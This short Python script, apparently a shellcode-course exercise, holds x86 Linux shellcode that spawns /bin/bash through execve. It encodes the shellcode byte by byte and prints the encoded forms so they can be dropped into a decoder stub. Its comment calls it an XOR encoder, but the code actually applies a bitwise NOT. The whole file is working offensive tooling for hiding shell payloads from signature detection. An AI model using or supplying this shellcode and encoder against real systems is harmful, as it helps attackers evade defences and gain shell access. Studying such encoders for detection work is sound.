#!/usr/bin/python3

# Python XOR Encoder

shellcode = b'\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'

encoded = ""
encoded2 = ""

print('Encoded shellcode....')

for x in bytearray(shellcode):
    y = ~x
    encoded += '\\x'
    encoded += '%02x' % (y & 0xff)

    encoded2 += '0x'
    encoded2 += '%02x,' % (y & 0xff)

print(encoded)
print("--------------------------------------")
print(encoded2)


print('Len: %d' % len(bytearray(shellcode)))